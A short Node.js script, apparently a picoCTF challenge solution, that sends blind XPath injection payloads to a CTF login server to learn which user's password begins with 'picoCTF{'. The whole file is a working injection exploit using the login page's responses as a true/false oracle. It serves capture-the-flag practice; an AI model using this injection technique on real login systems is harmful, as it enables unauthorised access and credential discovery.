
import fs   from 'fs';
import http from 'http';



const is_the_flag = (user_id, callback) => {

	let payload = "";

	payload += "name=" + encodeURIComponent("' or //user[position()=" + user_id + "]/pass[starts-with(text(), 'picoCTF{')] or 'a'='");
	payload += "&pass=whatever"; // TODO: Bruteforce this!?

	let request = http.request('http://mercury.picoctf.net:28065/', {
		headers: {
			'Content-Length': payload.length,
			'Content-Type': 'application/x-www-form-urlencoded'
		},
		method: 'POST'
	}, (response) => {

		const chunks = [];

		response.on('data', (data) => chunks.push(data));
		response.on('end', () => {

			let html = Buffer.concat(chunks).toString('utf8');
			if (html.includes('You&#39;re on the right path.') === true) {

				callback(true);

			} else if (html.includes('Login failure.') === true) {

				callback(false);

			}

		});

	});

	request.on('error', (err) => {
		console.error(user_id, err);
	});

	request.end(payload);

};

for (let id = 1; id <= 3; id++) {

	is_the_flag(id, (result) => {

		if (result === true) {
			console.log('user #' + id + ' is the flag!');
		} else {
			console.log('user #' + id + ' is NOT the flag!');
		}

	});

}

// We found out:
// - user #3 has a password starting with picoCTF{

